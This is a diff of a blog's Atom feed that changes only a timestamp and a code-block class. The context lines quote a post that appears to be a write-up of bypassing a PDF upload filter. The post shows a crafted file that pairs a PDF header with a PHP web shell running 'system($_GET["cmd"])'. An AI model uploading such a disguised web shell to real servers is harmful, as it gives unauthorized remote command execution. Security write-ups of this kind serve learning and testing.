@@ -4,7 +4,7 @@
   <title><![CDATA[Category: php | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/php/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-14T16:04:35-05:00</updated>
+  <updated>2016-06-14T16:05:48-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -82,7 +82,7 @@
 
 <p>Exam the webpage, I find that I can upload pdf file to the server. I tried just rename webshell.txt to webshell.pdf and the server doesn&rsquo;t accpet it. I guess the server will valid the pdf file format. So I create a craft pdf file:</p>
 
-<pre><code>%PDF-1.4
+<pre><code class="php webshell.pdf">%PDF-1.4
 &lt;?php
   system($_GET["cmd"]);
 ?&gt;
